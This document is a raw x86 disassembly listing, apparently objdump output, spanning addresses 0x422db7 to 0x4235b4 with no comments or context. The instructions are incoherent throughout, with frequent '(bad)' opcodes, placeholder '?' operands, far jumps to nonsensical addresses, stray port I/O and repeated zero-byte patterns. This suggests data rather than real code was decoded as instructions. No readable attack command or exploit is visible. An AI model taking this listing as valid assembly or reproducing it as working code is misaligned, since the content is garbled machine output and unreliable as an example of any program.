  422db7:	dec    edi
  422db8:	xchg   ecx,eax
  422db9:	mov    dl,0x29
  422dbb:	mov    dh,0xe
  422dbd:	dec    eax
  422dbe:	sbb    eax,0x5d44d34c
  422dc3:	pop    esi
  422dc4:	inc    esi
  422dc5:	jmp    0x50e312
  422dca:	mov    ah,0x11
  422dcc:	xor    DWORD PTR [eax],esi
  422dce:	xchg   ecx,eax
  422dcf:	call   0xd2392d8f
  422dd4:	cmc    
  422dd5:	mov    DWORD PTR [ebp+0x52],edx
  422dd8:	or     DWORD PTR [ebx-0x1d9e421c],eax
  422dde:	(bad)  
  422ddf:	and    dh,BYTE PTR [ecx]
  422de1:	and    BYTE PTR [edx-0x7d],ah
  422de4:	ja     0x422e40
  422de6:	add    BYTE PTR [eax],al
  422de8:	add    BYTE PTR [eax],al
  422dea:	add    BYTE PTR [edx-0x74],ah
  422ded:	cmc    
  422dee:	(bad)  
  422def:	and    al,0xbe
  422df1:	jmp    0x5475:0xe682218b
  422df8:	pop    es
  422df9:	cwde   
  422dfa:	inc    esp
  422dfb:	int    0x6d
  422dfd:	pop    ebp
  422dfe:	adc    DWORD PTR ds:0xcd4c984b,0x65
  422e05:	cmc    
  422e06:	imul   di,WORD PTR [ebp+0x52758bea],0x8b09
  422e0f:	adc    DWORD PTR [edi-0x42d94f6e],ebp
  422e15:	mov    ?,ebp
  422e17:	mul    BYTE PTR [ebx]
  422e19:	sbb    ecx,DWORD PTR [ebx-0x39ce8ea3]
  422e1f:	nop
  422e20:	pop    ds
  422e21:	int    0x17
  422e23:	fcomi  st,st(2)
  422e25:	pop    edx
  422e26:	jmp    FWORD PTR [edi+0x5b]
  422e29:	ins    BYTE PTR es:[edi],dx
  422e2a:	retf   0x6a78
  422e2d:	pop    edx
  422e2e:	call   FWORD PTR [edi-0x2c]
  422e31:	into   
  422e32:	and    esi,DWORD PTR [eax+0x74237ed4]
  422e38:	fsubr  QWORD PTR [edx]
  422e3a:	add    eax,esp
  422e3c:	and    eax,0xd46588bb
  422e41:	sub    bh,ah
  422e43:	jmp    0xddb3:0x1bfc19bd
  422e4a:	clc    
  422e4b:	popf   
  422e4c:	inc    edx
  422e4d:	ins    BYTE PTR es:[edi],dx
  422e4e:	rol    BYTE PTR [eax],cl
  422e50:	add    BYTE PTR [eax],al
  422e52:	add    BYTE PTR [eax],al
  422e54:	or     ebx,DWORD PTR [ecx+0x5fe6950a]
  422e5a:	sbb    BYTE PTR [eax-0x502e9d23],cl
  422e60:	pop    es
  422e61:	jo     0x422df7
  422e63:	cld    
  422e64:	call   DWORD PTR [edi+0x6d]
  422e67:	pop    edi
  422e68:	idiv   DWORD PTR [edi+0x18]
  422e6b:	cmp    bl,ch
  422e6d:	inc    edi
  422e6e:	ins    DWORD PTR es:[edi],dx
  422e6f:	mov    DWORD PTR [eax-0x44cdeea5],edx
  422e75:	jno    0x422e0b
  422e77:	call   edi
  422e79:	pop    edx
  422e7a:	scas   eax,DWORD PTR es:[edi]
  422e7b:	mov    BYTE PTR [edi+edi*2-0x36],dl
  422e7f:	sbb    DWORD PTR gs:[edi-0x60f4ce12],edx
  422e86:	out    dx,al
  422e87:	sub    BYTE PTR ds:0x192feeaf,al
  422e8d:	lahf   
  422e8e:	out    dx,al
  422e8f:	xor    edi,DWORD PTR [eax-0x6003b995]
  422e95:	rcr    DWORD PTR [ecx],cl
  422e97:	adc    BYTE PTR [edi-0x447c1721],0xb2
  422e9e:	je     0x422eaa
  422ea0:	test   BYTE PTR [esp+edi*1],bh
  422ea3:	sbb    ebx,DWORD PTR [ebx+ecx*1]
  422ea6:	test   DWORD PTR [ebx],0x8f5c6809
  422eac:	mov    bl,0x92
  422eae:	pusha  
  422eaf:	cmp    ecx,edi
  422eb1:	in     al,dx
  422eb2:	aas    
  422eb3:	ret    
  422eb4:	pop    edx
  422eb5:	push   eax
  422eb6:	and    al,0xce
  422eb8:	add    BYTE PTR [eax],al
  422eba:	add    BYTE PTR [eax],al
  422ebc:	add    BYTE PTR [eax-0x3a],dl
  422ebf:	lock jle 0x422f26
  422ec2:	cmp    al,0x25
  422ec4:	sbb    esi,DWORD PTR [ebp+0x20]
  422ec7:	or     al,0xa
  422ec9:	sub    cl,al
  422ecb:	js     0x422ed8
  422ecd:	xor    al,0xc6
  422ecf:	hlt    
  422ed0:	inc    ecx
  422ed1:	rcl    DWORD PTR [esi-0x4ac75111],cl
  422ed7:	test   eax,0xf80082e
  422edc:	cmp    esp,esp
  422ede:	dec    edi
  422edf:	cld    
  422ee0:	or     BYTE PTR [eax],0xb2
  422ee3:	dec    edx
  422ee4:	jmp    0xc659:0xec13ce87
  422eeb:	in     al,dx
  422eec:	or     BYTE PTR [ebx-0x267ae86a],al
  422ef2:	dec    edi
  422ef3:	aam    0x90
  422ef5:	mov    bl,0xae
  422ef7:	pusha  
  422ef8:	cmp    dh,bh
  422efa:	push   eax
  422efb:	mov    ds:0xb735d409,eax
  422f00:	stc    
  422f01:	and    dh,BYTE PTR [ecx+eiz*2+0x45]
  422f05:	scas   al,BYTE PTR es:[edi]
  422f06:	jne    0x422e92
  422f08:	or     DWORD PTR [eax+ecx*2-0x4e6c1fc5],edi
  422f0f:	and    eax,0xfd77be7d
  422f14:	pop    ss
  422f15:	sbb    bl,dh
  422f17:	test   DWORD PTR [edi+0xe0e5a92],0x62ed500e
  422f21:	add    BYTE PTR [eax],al
  422f23:	add    BYTE PTR [eax],al
  422f25:	add    dl,dl
  422f27:	in     eax,dx
  422f28:	shr    ch,1
  422f2a:	xchg   ebx,eax
  422f2b:	call   0x3c8387c9
  422f30:	push   esp
  422f31:	in     eax,dx
  422f32:	inc    ebx
  422f33:	dec    esi
  422f34:	add    ebx,ecx
  422f36:	bound  ecx,QWORD PTR [edi+0x3494720e]
  422f3c:	in     eax,dx
  422f3d:	mov    ah,0x67
  422f3f:	xor    al,0xe4
  422f41:	mov    ebp,0xc3043a5b
  422f46:	xchg   edx,eax
  422f47:	cmp    esp,ebx
  422f49:	es ds cmp dl,ch
  422f4d:	mov    esi,0xece471e9
  422f52:	xchg   ebx,eax
  422f53:	xor    DWORD PTR [edx-0x17],edx
  422f56:	xchg   edx,eax
  422f57:	ret    
  422f58:	and    al,0x9f
  422f5a:	fld    st(7)
  422f5c:	nop
  422f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f5e:	xchg   ebx,eax
  422f5f:	call   0xa1c60c51
  422f64:	dec    esi
  422f65:	jmp    0x2dd27edd
  422f6a:	mov    WORD PTR [edx],ds
  422f6c:	andps  xmm5,xmm4
  422f6f:	xor    DWORD PTR [ebx],esi
  422f71:	jno    0x422f87
  422f73:	repz push cs
  422f75:	jmp    0xed167f61
  422f7a:	out    0x31,eax
  422f7c:	push   edx
  422f7d:	jmp    0xe992e3ca
  422f82:	ins    DWORD PTR es:[edi],dx
  422f83:	dec    edi
  422f84:	nop
  422f85:	and    eax,0xfcede894
  422f8a:	add    BYTE PTR [eax],al
  422f8c:	add    BYTE PTR [eax],al
  422f8e:	add    BYTE PTR [ebx-0x1616b15f],ch
  422f94:	jno    0x422fda
  422f96:	(bad)  
  422f97:	(bad)  
  422f98:	es jns 0x422fc0
  422f9b:	xchg   esp,eax
  422f9c:	xor    esp,esp
  422f9e:	add    BYTE PTR [ebp+0x1ce9648],ah
  422fa4:	inc    ebx
  422fa5:	in     eax,dx
  422fa6:	jmp    FWORD PTR [ecx+0x1ae8dbcd]
  422fac:	xor    ebp,ebp
  422fae:	(bad)  
  422faf:	cli    
  422fb0:	ins    BYTE PTR es:[edi],dx
  422fb1:	test   DWORD PTR [ebx+0x35],ebp
  422fb4:	mov    dl,0xe
  422fb6:	pop    esi
  422fb7:	stos   BYTE PTR es:[edi],al
  422fb8:	add    eax,DWORD PTR [edx-0x75]
  422fbb:	shl    BYTE PTR [esi-0x1d],0x39
  422fbf:	es push edx
  422fc1:	arpl   WORD PTR [esi],di
  422fc3:	cli    
  422fc4:	sbb    al,0x96
  422fc6:	inc    edi
  422fc7:	cmp    eax,0xb4b009cf
  422fcc:	sahf   
  422fcd:	popa   
  422fce:	sub    al,dl
  422fd0:	into   
  422fd1:	xor    eax,0xf6b22908
  422fd6:	mov    eax,0x8b0eb1a8
  422fdb:	shl    BYTE PTR [ebp+0x15],cl
  422fde:	add    BYTE PTR [ecx],bh
  422fe0:	int    0xf8
  422fe2:	je     0x423013
  422fe4:	iret   
  422fe5:	fsubr  st,st(0)
  422fe7:	lock out 0xeb,al
  422fea:	push   DWORD PTR [edx-0x7c]
  422fed:	cmc    
  422fee:	mov    al,ds:0x8b0eb678
  422ff3:	add    BYTE PTR [eax],al
  422ff5:	add    BYTE PTR [eax],al
  422ff7:	add    BYTE PTR [edx-0x51],al
  422ffa:	test   BYTE PTR [ecx+0x3b54b1e9],al
  423000:	inc    esi
  423001:	push   esi
  423002:	pop    edi
  423003:	(bad)  
  423004:	lods   al,BYTE PTR ds:[esi]
  423005:	sbb    DWORD PTR [edx-0x1],eax
  423008:	(bad)  
  423009:	in     eax,dx
  42300a:	(bad)  
  42300b:	aas    
  42300c:	jmp    0x325a92db
  423011:	test   dl,dl
  423013:	push   es
  423014:	push   ebp
  423015:	retf   
  423016:	sub    eax,0xdc772100
  42301b:	(bad)  
  42301c:	nop
  42301d:	and    al,0x69
  42301f:	dec    ebp
  423020:	xchg   esp,eax
  423021:	pushf  
  423022:	sub    eax,0xd2fd8405
  423027:	(bad)  
  423028:	cmp    eax,0x907e8822
  42302d:	pop    ebx
  42302e:	mov    ds:0xbda5e550,al
  423033:	mov    BYTE PTR [eax+eax*8],al
  423036:	cli    
  423037:	mov    BYTE PTR [ecx-0x3e],ch
  42303a:	xchg   BYTE PTR [ebx],ah
  42303c:	mov    al,ds:0x140c15de
  423041:	pop    ss
  423042:	adc    al,BYTE PTR [eax]
  423044:	nop
  423045:	fcom   DWORD PTR ds:0xd9d78ffc
  42304b:	(bad)  
  42304c:	push   edi
  42304d:	pop    ebx
  42304e:	rcr    al,0x1b
  423051:	test   al,0xdb
  423053:	push   edx
  423054:	jo     0x423083
  423056:	out    dx,eax
  423057:	mov    ch,dl
  423059:	dec    edi
  42305a:	push   0x7
  42305f:	add    BYTE PTR [eax],al
  423061:	or     eax,0x690f7e92
  423066:	bound  edi,QWORD PTR [esi+0xb]
  423069:	sbb    dl,BYTE PTR [edi]
  42306b:	int    0x1b
  42306d:	pop    eax
  42306e:	adc    ch,ch
  423070:	imul   edx,DWORD PTR [eax+0x52439d20],0xcb0352d8
  42307a:	mov    ?,edx
  42307c:	jno    0x42306f
  42307e:	ficom  DWORD PTR [ebp-0x1ba44fdd]
  423084:	adc    DWORD PTR [ebp+0x7800115a],0x4f
  42308b:	jmp    0xeb23108f
  423090:	cld    
  423091:	popf   
  423092:	mov    bl,0x91
  423094:	inc    ebx
  423095:	nop
  423096:	sbb    al,0xde
  423098:	ja     0x42303c
  42309a:	mov    dl,0x37
  42309c:	add    al,0x9
  42309e:	inc    edx
  42309f:	jb     0x4230ae
  4230a1:	test   BYTE PTR [esi],dh
  4230a3:	pop    DWORD PTR [ebx]
  4230a5:	nop
  4230a6:	mov    dl,0x71
  4230a8:	mov    bh,0x73
  4230aa:	scas   al,BYTE PTR es:[edi]
  4230ab:	in     al,0x4d
  4230ad:	ficomp WORD PTR [eax-0x5b27048]
  4230b3:	jmp    0x423094
  4230b5:	adc    BYTE PTR [esi+0x7c],bh
  4230b8:	sbb    bh,BYTE PTR [ecx+ecx*4-0x4d682472]
  4230bf:	not    DWORD PTR [eax-0x28a17671]
  4230c5:	add    BYTE PTR [eax],al
  4230c7:	add    BYTE PTR [eax],al
  4230c9:	add    BYTE PTR [edi-0x6f70084e],dl
  4230cf:	jg     0x423101
  4230d1:	ret    0x72a0
  4230d4:	jae    0x423100
  4230d6:	test   ch,dh
  4230d8:	ss sbb al,0x7
  4230db:	mov    bl,0xf7
  4230dd:	add    esp,DWORD PTR [edi]
  4230df:	pop    ss
  4230e0:	cmp    BYTE PTR [edi-0x70c8c8c1],0x8b
  4230e7:	jecxz  0x4230ed
  4230e9:	xor    eax,esi
  4230eb:	cmp    BYTE PTR [ebx-0xc87421],cl
  4230f1:	sbb    DWORD PTR [eax+0x4d063a2f],edx
  4230f7:	neg    ebx
  4230f9:	out    0xe,eax
  4230fb:	pop    ecx
  4230fc:	cmc    
  4230fd:	jp     0x4230f3
  4230ff:	cmp    dl,BYTE PTR [ebx-0x20]
  423102:	fwait
  423103:	cmp    bh,BYTE PTR ds:0x3679c100
  423109:	jnp    0x4230b8
  42310b:	pop    edx
  42310c:	pop    ebx
  42310d:	test   bh,ah
  42310f:	dec    ebx
  423110:	jp     0x423156
  423112:	arpl   WORD PTR [esi-0x4f1713a1],si
  423118:	push   cs
  423119:	bound  edx,QWORD PTR [ecx+0x34]
  42311c:	xchg   esp,eax
  42311d:	add    esp,eax
  42311f:	dec    ebx
  423120:	in     eax,dx
  423121:	push   0xffffff97
  423123:	dec    esi
  423124:	(bad)  
  423125:	int3   
  423126:	sbb    DWORD PTR [eax-0x6c2069bf],esp
  42312c:	xchg   ecx,eax
  42312d:	and    eax,0x0
  423132:	add    BYTE PTR [ebp+ecx*2-0x745dfefd],cl
  423139:	push   cs
  42313a:	fs dec esp
  42313c:	mov    edi,0xaf4c6308
  423141:	and    BYTE PTR ds:0xc197a770,bl
  423147:	jnp    0x423114
  423149:	out    dx,eax
  42314a:	call   0x605524b2
  42314f:	cmp    al,0xb7
  423151:	xchg   esi,eax
  423152:	mov    cl,0x63
  423154:	xor    al,0x36
  423156:	jb     0x423104
  423158:	cmp    bl,BYTE PTR [edx+0x5]
  42315b:	pop    esp
  42315c:	xor    cl,bh
  42315e:	ror    edx,1
  423160:	sub    eax,0xb293e13a
  423165:	cdq    
  423166:	call   0xf9807f58
  42316b:	adc    BYTE PTR [ebx-0x13],al
  42316e:	pushf  
  42316f:	pop    edi
  423170:	cmp    bl,BYTE PTR [ecx+eax*8+0x11ed4b2b]
  423177:	inc    esi
  423178:	retf   
  423179:	push   cs
  42317a:	jmp    0xe17c3f17
  42317f:	xchg   ebx,eax
  423180:	mov    dl,0x93
  423182:	out    dx,al
  423183:	pop    ss
  423184:	mov    ebp,0xe9bb699
  423189:	lahf   
  42318a:	fisttp WORD PTR [edx+edi*1-0x35023e23]
  423191:	push   cs
  423192:	jmp    0x138aeff
  423197:	add    BYTE PTR [eax],al
  423199:	add    BYTE PTR [eax],al
  42319b:	add    dh,ah
  42319d:	cs in  eax,dx
  42319f:	(bad)  
  4231a0:	(bad)  
  4231a2:	dec    edx
  4231a3:	pop    esi
  4231a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231a5:	sbb    DWORD PTR [edx+eax*8-0x1b],eax
  4231a9:	scas   al,BYTE PTR es:[edi]
  4231aa:	xchg   edi,eax
  4231ab:	(bad)  
  4231ac:	and    bh,BYTE PTR [ebx-0x4f2de2]
  4231b2:	or     al,0x76
  4231b4:	addr16 leave 
  4231b6:	sub    al,0x1c
  4231b8:	push   0xffffffc8
  4231ba:	dec    ecx
  4231bb:	and    al,0xa5
  4231bd:	sbb    eax,0x42cd7c96
  4231c2:	inc    ebx
  4231c3:	mov    ecx,DWORD PTR [ecx-0x37]
  4231c6:	jecxz  0x42323c
  4231c8:	jo     0x423247
  4231ca:	sub    esi,DWORD PTR [ebp+0x6c]
  4231cd:	jle    0x42321a
  4231cf:	add    al,0x5d
  4231d1:	dec    ebx
  4231d2:	dec    edi
  4231d3:	cmp    DWORD PTR [ecx-0x66aed9b7],0x24
  4231da:	cmc    
  4231db:	jmp    0x423237
  4231dd:	xor    ebp,DWORD PTR [eax+ebx*1-0x1133505]
  4231e4:	sub    DWORD PTR [edx-0x6a],ecx
  4231e7:	mov    ss,WORD PTR [ecx-0x5e0012ba]
  4231ed:	out    dx,eax
  4231ee:	push   0x0
  4231f0:	sub    ebx,ecx
  4231f2:	stos   DWORD PTR es:[edi],eax
  4231f3:	sub    al,0x31
  4231f5:	mov    dh,0xe
  4231f7:	test   DWORD PTR [esi+0x668b1b39],edx
  4231fd:	lods   eax,DWORD PTR ds:[esi]
  4231fe:	pop    edx
  4231ff:	mov    cl,0x0
  423201:	add    BYTE PTR [eax],al
  423203:	add    BYTE PTR [eax],al
  423205:	pop    ss
  423206:	mov    dh,0x96
  423208:	iret   
  423209:	xchg   ecx,eax
  42320a:	out    0x6a,eax
  42320c:	add    cl,bh
  42320e:	retf   0xe8db
  423211:	push   ss
  423212:	ss push cs
  423214:	add    BYTE PTR [edi-0x6f3dba2b],dh
  42321a:	push   ebx
  42321b:	adc    DWORD PTR [ebp+0x1b],edx
  42321e:	or     BYTE PTR [eax-0x79],cl
  423221:	gs aas 
  423223:	xchg   esp,eax
  423224:	mov    edx,0x1143a8
  423229:	nop
  42322a:	xchg   DWORD PTR [ebx+edi*8],eax
  42322d:	cmp    eax,0xa0559c63
  423232:	adc    BYTE PTR [edi+0x14],ah
  423235:	test   al,0x11
  423237:	inc    ebp
  423238:	sti    
  423239:	scas   eax,DWORD PTR es:[edi]
  42323a:	(bad)  
  42323b:	shl    BYTE PTR [ebp+0x54],cl
  42323e:	aam    0x80
  423240:	sub    al,0x88
  423242:	pop    ebx
  423243:	adc    DWORD PTR [ebp-0x7faec037],eax
  423249:	or     eax,0xca751164
  42324e:	fsub   DWORD PTR [edi+0x14]
  423251:	jg     0x4232b9
  423253:	add    ebx,edi
  423255:	std    
  423256:	inc    ebx
  423257:	stc    
  423258:	sbb    BYTE PTR [ecx],ah
  42325a:	loope  0x42326d
  42325c:	sub    BYTE PTR [eax-0x8],0x67
  423260:	pop    ds
  423261:	mov    esp,0x5b882cd0
  423267:	adc    DWORD PTR [ebp+0x0],eax
  42326d:	add    BYTE PTR [edi+0x7],cl
  423270:	inc    DWORD PTR [esi-0x4f090ca9]
  423276:	ds nop
  423278:	popf   
  423279:	retf   
  42327a:	sub    BYTE PTR [eax+edx*4+0x0],dl
  42327e:	nop
  42327f:	fdivr  QWORD PTR [eax+0x115b982c]
  423285:	add    BYTE PTR [edi+0x508516a4],bh
  42328b:	mov    esi,0x20d02f13
  423290:	outs   dx,BYTE PTR ds:[esi]
  423291:	mov    esi,0x55425b9c
  423296:	or     esi,DWORD PTR [edx+0x3b5d5abe]
  42329c:	pop    ebx
  42329d:	sub    BYTE PTR [ecx+ecx*2-0xd690c16],bl
  4232a4:	imul   DWORD PTR [ebp-0x6f]
  4232a7:	dec    ecx
  4232a8:	sub    ebp,DWORD PTR [eax]
  4232aa:	je     0x4232e9
  4232ac:	mov    edx,0xc38e4502
  4232b1:	jmp    0x4232d2
  4232b3:	inc    edi
  4232b4:	mov    esp,0x7a4a0802
  4232b9:	add    al,BYTE PTR [esi+ebp*1-0x4d6ffcb3]
  4232c0:	ja     0x423341
  4232c2:	ins    BYTE PTR es:[edi],dx
  4232c3:	mov    ds:0xbe4256f7,al
  4232c8:	in     eax,0x90
  4232ca:	sti    
  4232cb:	mov    ch,0xf3
  4232cd:	add    edx,DWORD PTR [eax+0xf2c35]
  4232d3:	add    BYTE PTR [eax],al
  4232d5:	add    BYTE PTR [eax],al
  4232d7:	cwde   
  4232d8:	mov    dl,0xf7
  4232da:	out    dx,al
  4232db:	mov    DWORD PTR ds:0x508d4,esi
  4232e1:	fild   WORD PTR [edi]
  4232e3:	nop
  4232e4:	mov    dl,0x70
  4232e6:	push   edi
  4232e7:	lods   al,BYTE PTR ds:[esi]
  4232e8:	call   0x347:0x2e8bd572
  4232ef:	nop
  4232f0:	mov    dl,0x60
  4232f2:	outs   dx,DWORD PTR ds:[esi]
  4232f3:	je     0x423283
  4232f5:	hlt    
  4232f6:	mov    edx,0x5f70a06
  4232fb:	nop
  4232fc:	mov    dl,0xf0
  4232fe:	aam    0x8b
  423300:	hlt    
  423301:	pop    ds
  423302:	mov    ss,WORD PTR [edx+0x27cc4cb7]
  423308:	jae    0x42334b
  42330a:	add    edx,DWORD PTR [edx+esi*4-0x713b7309]
  423311:	xlat   BYTE PTR ds:[ebx]
  423312:	ds dec esi
  423314:	ror    DWORD PTR [esi],0xde
  423317:	mov    dh,0x8
  423319:	aaa    
  42331a:	out    0x92,eax
  42331c:	adc    DWORD PTR [ecx],0xffffffaa
  42331f:	pop    esp
  423320:	imul   ebp
  423322:	hlt    
  423323:	dec    edi
  423324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423325:	dec    esi
  423326:	jmp    0xfd752a3f
  42332b:	adc    al,0x6f
  42332d:	sbb    dh,BYTE PTR [edx-0x76]
  423330:	loope  0x423343
  423332:	stos   BYTE PTR es:[edi],al
  423333:	addr16 loop 0x423323
  423336:	fsub   QWORD PTR [edi-0x5c]
  423339:	dec    esi
  42333a:	jmp    0x42333f
  42333f:	add    BYTE PTR [edi+ebp*8],cl
  423342:	xor    dl,ch
  423344:	xchg   edx,eax
  423345:	mov    ah,0x91
  423347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423348:	adc    al,0xe
  42334b:	xchg   esi,eax
  42334c:	push   0xfffffff7
  42334e:	inc    ebp
  42334f:	mov    ds,WORD PTR [eax]
  423351:	mov    ?,WORD PTR [esi]
  423353:	xchg   ecx,eax
  423354:	mov    edi,0x177eed4c
  423359:	jb     0x4233bd
  42335b:	fdivr  DWORD PTR [edx-0x6b48124c]
  423361:	pop    es
  423362:	ds mov edx,0xf74aa090
  423368:	shl    DWORD PTR [edx+0x2f802d91],cl
  42336e:	inc    edx
  42336f:	add    eax,0xd7947ac
  423374:	lods   al,BYTE PTR ds:[esi]
  423375:	pop    DWORD PTR [edx+0x5]
  423378:	je     0x4233b3
  42337a:	inc    edx
  42337b:	or     eax,0xb193bb74
  423380:	nop
  423381:	inc    esi
  423382:	in     eax,dx
  423383:	jb     0x423345
  423385:	mov    ?,esi
  423387:	mov    esi,0xfcedddcc
  42338c:	cmp    edi,DWORD PTR [eax-0x1a4f16b2]
  423392:	inc    edi
  423393:	add    BYTE PTR [ebx-0x56],ch
  423396:	push   cs
  423397:	push   ebp
  423398:	add    BYTE PTR [edx+0x6d],0x7d
  42339c:	loope  0x423351
  42339e:	inc    eax
  42339f:	mov    edi,eax
  4233a1:	mov    eax,ds:0xb493
  4233a6:	add    BYTE PTR [eax],al
  4233a8:	add    cl,ch
  4233aa:	mov    dl,0xe
  4233ac:	push   edi
  4233ad:	(bad)  
  4233ae:	enter  0x8502,0xbe
  4233b2:	mov    eax,ds:0xb2e9a792
  4233b7:	push   cs
  4233b8:	mul    BYTE PTR [esi+ecx*4+0x28340eec]
  4233bf:	push   cs
  4233c0:	add    BYTE PTR [ecx-0x56ef94d3],bh
  4233c6:	mov    edi,0x92648b09
  4233cb:	xchg   ebx,eax
  4233cc:	sar    BYTE PTR [esi-0x46ff65d2],0xb2
  4233d3:	jmp    0x130c4208
  4233d8:	push   0xffffffa9
  4233da:	mov    cl,0x64
  4233dc:	or     al,0xe
  4233de:	mov    ebp,0xb438e816
  4233e3:	jmp    0xa17d:0x6dca12ff
  4233ea:	scas   al,BYTE PTR es:[edi]
  4233eb:	arpl   WORD PTR [edx-0x32],si
  4233ee:	pushf  
  4233ef:	jle    0x423403
  4233f1:	cmp    DWORD PTR [edx-0x4d951ad5],esi
  4233f7:	push   cs
  4233f8:	jne    0x42343e
  4233fa:	fist   WORD PTR [ebp-0x3ad26aa3]
  423400:	je     0x42341f
  423402:	das    
  423403:	adc    BYTE PTR gs:[ecx],ch
  423406:	mov    esi,0x9c6e5640
  42340b:	ficom  WORD PTR [edx]
  42340d:	add    BYTE PTR [eax],al
  42340f:	add    BYTE PTR [eax],al
  423411:	add    cl,bh
  423413:	mov    cl,0x74
  423415:	add    DWORD PTR [eax-0x5a04eecf],edx
  42341b:	addr16 call 0xffb:0xed1728ca
  423423:	iret   
  423424:	shl    DWORD PTR [esi+edi*4-0x25],1
  423428:	ins    BYTE PTR es:[edi],dx
  423429:	or     BYTE PTR [eax+0x88cffbf],dl
  42342f:	mov    al,0x1a
  423431:	add    BYTE PTR [eax-0x67ef7d2a],dl
  423437:	pop    ebx
  423438:	adc    edi,esp
  42343a:	mov    esi,fs
  42343c:	call   0x208d:0x115b8810
  423443:	push   0xd2900019
  423448:	imul   eax,DWORD PTR [edi+edx*8],0xffffff9a
  42344c:	sbb    al,BYTE PTR [ecx]
  42344e:	nop
  42344f:	pop    ebx
  423450:	adc    DWORD PTR [edi+0x19a4b53],eax
  423456:	imul   ebx,DWORD PTR [ecx+0x66],0x117a12ff
  42345d:	push   edx
  42345e:	xchg   edi,eax
  42345f:	data16 stc 
  423461:	push   cs
  423462:	rcr    BYTE PTR [ebx+0x48],1
  423465:	pop    ebx
  423466:	out    0x9e,al
  423468:	shl    BYTE PTR [eax+edx*4],1
  42346b:	popf   
  42346c:	inc    ebp
  42346d:	xchg   DWORD PTR [ecx+0x4],edi
  423470:	in     al,dx
  423471:	adc    eax,0x514960
  423476:	add    BYTE PTR [eax],al
  423478:	add    BYTE PTR [eax],al
  42347a:	add    dl,bh
  42347c:	pop    ebx
  42347d:	in     al,dx
  42347e:	je     0x423434
  423480:	aas    
  423481:	cwde   
  423482:	retf   
  423483:	push   edi
  423484:	pop    es
  423485:	xor    eax,0xe9fa3814
  42348a:	sti    
  42348b:	inc    edi
  42348c:	shl    dl,1
  42348e:	test   DWORD PTR [esi-0x1],eax
  423491:	es xchg cx,ax
  423494:	mov    dl,0x34
  423496:	mov    dh,0x9c
  423498:	mov    edx,0x341503f7
  42349d:	repz pop es
  42349f:	nop
  4234a0:	mov    dl,0xa6
  4234a2:	push   ebp
  4234a3:	scas   al,BYTE PTR es:[edi]
  4234a4:	mov    bl,0xff
  4234a6:	cwde   
  4234a7:	or     eax,0x9169ec45
  4234ac:	inc    ebp
  4234ad:	sub    eax,0xf7b2940c
  4234b2:	nop
  4234b3:	push   edx
  4234b4:	scas   eax,DWORD PTR es:[edi]
  4234b5:	daa    
  4234b6:	push   esi
  4234b7:	jbe    0x42346b
  4234b9:	mov    edi,0xc444e584
  4234be:	(bad)  
  4234bf:	fs mov fs,edi
  4234c2:	mov    cl,bl
  4234c4:	inc    esp
  4234c5:	sub    ebp,DWORD PTR [eax]
  4234c7:	mov    al,ds:0xc400e15a
  4234cc:	inc    esp
  4234cd:	or     al,0xff
  4234cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234d0:	pop    edx
  4234d1:	leave  
  4234d2:	inc    ebx
  4234d3:	nop
  4234d4:	in     eax,0x55
  4234d6:	ret    0xb298
  4234d9:	and    cl,BYTE PTR [ebx-0x74d3244c]
  4234df:	add    BYTE PTR [eax],al
  4234e1:	add    BYTE PTR [eax],al
  4234e3:	add    BYTE PTR ds:0xdf470b6,bl
  4234e9:	inc    ebp
  4234ea:	jmp    0x42355d
  4234ec:	pinsrw mm0,edi,0x3
  4234f0:	cld    
  4234f1:	(bad)  
  4234f2:	or     BYTE PTR [ebx-0x258d5d23],cl
  4234f8:	cld    
  4234f9:	iret   
  4234fa:	js     0x42347c
  4234fc:	test   BYTE PTR [edx+0x43c260c3],dh
  423502:	jmp    0x9069:0xf7f28ef3
  423509:	fdiv   st,st(7)
  42350b:	inc    ch
  42350d:	mov    edx,0xe538cd60
  423512:	push   cs
  423513:	xor    bh,BYTE PTR [esi]
  423515:	dec    eax
  423516:	cdq    
  423517:	and    DWORD PTR [eax],ecx
  423519:	jp     0x42357d
  42351b:	loop   0x423537
  42351d:	loopne 0x42351d
  42351f:	imul   ecx,DWORD PTR [ebx+eiz*4],0x16
  423523:	jmp    0x9440b0bb
  423528:	lea    esi,[eax+0x53]
  42352b:	cmc    
  42352c:	xchg   ebx,eax
  42352d:	dec    ebx
  42352e:	sbb    al,0x6c
  423530:	or     al,0xa7
  423532:	push   ss
  423533:	jmp    0x7440b0cb
  423538:	xchg   ebp,eax
  423539:	jo     0x42358e
  42353b:	cmc    
  42353c:	xchg   edx,eax
  42353d:	ret    
  42353e:	cs jmp 0x29dbc928
  423544:	mov    BYTE PTR [ebx],ch
  423546:	fmul   st(6),st
  423548:	add    BYTE PTR [eax],al
  42354a:	add    BYTE PTR [eax],al
  42354c:	add    BYTE PTR [esi+ebp*4+0x78],bl
  423550:	jmp    0xbe58f321
  423555:	aas    
  423556:	mov    dh,0xf6
  423558:	dec    eax
  423559:	mov    edi,0xb517ed47
  42355e:	popf   
  42355f:	idiv   bl
  423561:	push   ebx
  423562:	mov    dl,0x49
  423564:	ds inc esi
  423566:	in     eax,0xd0
  423568:	stc    
  423569:	xchg   ebx,eax
  42356a:	fstp   QWORD PTR [ecx+0xa57117d]
  423570:	pop    ds
  423571:	jl     0x4234f4
  423573:	call   0x2c05baf6
  423578:	push   ecx
  423579:	jmp    0xff2b446c
  42357e:	mov    BYTE PTR [ecx-0x2d],al
  423581:	mov    ebx,0x64bac993
  423586:	jge    0x4235be
  423588:	push   0xffffffc8
  42358a:	mov    dl,0xed
  42358c:	hlt    
  42358d:	(bad)  [esi+ecx*2-0x21c5c700]
  423594:	test   DWORD PTR [edi-0x36],edi
  423597:	pop    es
  423598:	push   esi
  423599:	mov    al,0xe4
  42359b:	or     cl,BYTE PTR [ecx+0x5e968f07]
  4235a1:	pop    ebp
  4235a2:	outs   dx,BYTE PTR ds:[esi]
  4235a3:	push   eax
  4235a4:	sbb    BYTE PTR [ecx-0x79ffb1c7],cl
  4235aa:	fwait
  4235ab:	xchg   edx,eax
  4235ac:	adc    ch,cl
  4235ae:	scas   al,BYTE PTR es:[edi]
  4235af:	cmc    
  4235b0:	add    al,BYTE PTR [eax]
  4235b2:	add    BYTE PTR [eax],al
  4235b4:	add    BYTE PTR [eax],al
